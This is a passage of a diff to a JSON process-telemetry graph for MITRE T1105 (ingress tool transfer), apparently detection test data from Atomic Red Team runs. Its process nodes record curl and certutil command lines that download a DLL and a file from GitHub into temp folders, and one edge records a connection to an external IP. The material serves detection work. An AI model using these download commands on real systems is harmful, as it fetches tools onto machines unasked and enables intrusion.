+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+      "label": "curl.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-F32A-616E-083B-01000000F101}",
+        "pid": "2544",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "%system32%\\curl.exe  -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %temp%\\2\\allthethingsx64.dll",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "48561310a72b1997396bc8fb7228db6304482ec6d9742a18ee67f624aae5f015",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "curl.exe",
+        "name": "curl.exe",
+        "parent_process_id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3FA-605B-7A69-00000000AE01}",
+        "pid": "4760",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" –verifyctl -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "916b3643e3b1909f7d503f22540eb21d1874165d0e738dbd819d3e87abf8a10b",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "label": "bash",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{ec2d99e9-a6ec-61b4-0854-8e1210560000}",
+        "pid": "13740",
+        "image_path": "bin\\bash",
+        "command_line": "bash",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bash",
+        "name": "bash"
+      }
     }
   ],
-  "edges": [],
+  "edges": [
+    {
+      "id": "edge:T1105:1",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0fdb-62e4-782d-e0fe87550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0fdb-62e4-782d-e0fe87550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.537577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:2",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0f77-62e4-781d-5c1a9a550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0f77-62e4-781d-5c1a9a550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.538577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:3",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0f16-62e4-78bd-82e05d550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0f16-62e4-78bd-82e05d550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.539577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:4",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0e2a-62e4-78ad-3268be550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0e2a-62e4-78ad-3268be550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.540577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:5",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0e19-62e4-782d-c19dfa550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0e19-62e4-782d-c19dfa550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.540577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:6",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0de8-62e4-78dd-fab9d7550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0de8-62e4-78dd-fab9d7550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.540577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:7",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0d00-62e4-784d-26e689550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0d00-62e4-784d-26e689550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.542560+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:8",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0cf7-62e4-78ed-32828d550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0cf7-62e4-78ed-32828d550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.542560+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:9",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-0c88-62e4-78cd-bc06f4550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-0c88-62e4-78cd-bc06f4550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.542560+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:10",
+      "source": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "target": "Process:{ec28c72e-ee09-62e3-78dd-38347a550000}:1",
+      "from": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+      "to": "Process:{ec28c72e-ee09-62e3-78dd-38347a550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.543577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:11",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-cd5f-62e3-78cd-b3690d560000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-cd5f-62e3-78cd-b3690d560000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.543577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:12",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-cd5e-62e3-785d-93e58d550000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-cd5e-62e3-785d-93e58d550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.543577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:13",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-d3ea-62e3-782d-328196550000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-d3ea-62e3-782d-328196550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.544577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:14",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-d396-62e3-782d-b124e8550000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-d396-62e3-782d-b124e8550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.544577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:15",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-d38a-62e3-78ad-379917560000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-d38a-62e3-78ad-379917560000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.544577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:16",
+      "source": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "target": "Process:{ec28c72e-d389-62e3-788d-737768550000}:1",
+      "from": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "to": "Process:{ec28c72e-d389-62e3-788d-737768550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.544577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:19",
+      "source": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "target": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "from": "Process:{ec2d99e9-ed25-61ae-6812-b38ae4550000}:1",
+      "to": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.545577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:20",
+      "source": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "target": "network:<loopback_ip>:53:udp",
+      "from": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+      "to": "network:<loopback_ip>:53:udp",
+      "label": "Network Connection",
+      "type": "Network Connection",
+      "properties": {
+        "action": "Network Connection",
+        "event_id": "3",
+        "timestamp": "2026-05-06T14:37:39.545577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:30",
+      "source": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "target": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "from": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "to": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.550735+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:31",
+      "source": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "target": "network:45.155.205.233:5874:tcp",
+      "from": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+      "to": "network:45.155.205.233:5874:tcp",
+      "label": "Network Connection",
+      "type": "Network Connection",
+      "properties": {
+        "action": "Network Connection",
+        "event_id": "3",
+        "timestamp": "2026-05-06T14:37:39.550735+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:32",
+      "source": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "target": "Process:{ec2d99e9-8859-61b3-785d-af70fc550000}:1",
+      "from": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "to": "Process:{ec2d99e9-8859-61b3-785d-af70fc550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.550735+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:38",
+      "source": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "target": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "from": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "to": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.552577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:39",
+      "source": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "target": "Process:{ec2d99e9-ce9c-61b3-ec0e-02199b550000}:1",
+      "from": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "to": "Process:{ec2d99e9-ce9c-61b3-ec0e-02199b550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.552577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:40",
+      "source": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "target": "Process:{ec2d99e9-a732-61b4-785d-d223b3550000}:1",
+      "from": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "to": "Process:{ec2d99e9-a732-61b4-785d-d223b3550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.553577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:42",
+      "source": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "target": "Process:{ec2d99e9-a7d4-61b4-787d-a086d1550000}:1",
+      "from": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+      "to": "Process:{ec2d99e9-a7d4-61b4-787d-a086d1550000}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.553577+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:58",
+      "source": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "target": "File:f67d11806e3b95bd0953ef936a840020c632d0324630c76d0b163d5cf7b59a48:23",
+      "from": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "to": "File:f67d11806e3b95bd0953ef936a840020c632d0324630c76d0b163d5cf7b59a48:23",
+      "label": "File Delete (archived)",
+      "type": "File Delete (archived)",
+      "properties": {
+        "action": "File Delete (archived)",
+        "event_id": "23",
+        "timestamp": "2026-05-06T14:37:39.569554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:62",
+      "source": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:10",
+      "from": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.570553+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:63",
+      "source": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E2-605B-6B69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.571554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:65",
+      "source": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E2-605B-6A69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.572554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:67",
+      "source": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "from": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.573554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:75",
+      "source": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:10",
+      "from": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.575554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:77",
+      "source": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.578554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:78",
+      "source": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "from": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E4-605B-6E69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.578554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:81",
+      "source": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E4-605B-6D69-00000000AE01}:10",
+      "from": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E4-605B-6D69-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.579554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:91",
+      "source": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E7-605B-7669-00000000AE01}:1",
+      "from": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E7-605B-7669-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.586553+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:92",
+      "source": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "target": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+      "from": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+      "to": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.587554+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:105",
+      "source": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "target": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:10",
+      "from": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+      "to": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.598557+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:107",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.601558+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:109",
+      "source": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "target": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:10",
+      "from": "Process:{896A638B-B8E2-6058-B102-00000000AE01}:1",
+      "to": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.604558+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:111",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B3FA-605B-7A69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.606558+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:115",
+      "source": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "target": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:10",
+      "from": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "to": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:10",
+      "label": "ProcessAccess",
+      "type": "ProcessAccess",
+      "properties": {
+        "action": "ProcessAccess",
+        "event_id": "10",
+        "timestamp": "2026-05-06T14:37:39.611066+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:116",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.611066+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:118",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B403-605B-8169-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B403-605B-8169-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.616066+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:119",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B407-605B-8369-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B407-605B-8369-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.620066+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:125",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B41B-605B-8969-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B41B-605B-8969-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.633070+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:127",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B422-605B-8B69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B422-605B-8B69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.638070+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:128",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B42B-605B-8D69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B42B-605B-8D69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.644578+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:129",
+      "source": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "target": "Process:{896A638B-B432-605B-8F69-00000000AE01}:1",
+      "from": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+      "to": "Process:{896A638B-B432-605B-8F69-00000000AE01}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.649578+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:256",
+      "source": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "target": "Process:{38b9f94a-e3cf-6754-8b80-000000002f03}:1",
+      "from": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "to": "Process:{38b9f94a-e3cf-6754-8b80-000000002f03}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.703581+00:00"
+      }
+    },
+    {
+      "id": "edge:T1105:257",
+      "source": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "target": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "from": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "to": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "label": "Process Create",
+      "type": "Process Create",
+      "properties": {
+        "action": "Process Create",
+        "event_id": "1",
+        "timestamp": "2026-05-06T14:37:39.704582+00:00"
+      }
+    },
+    {
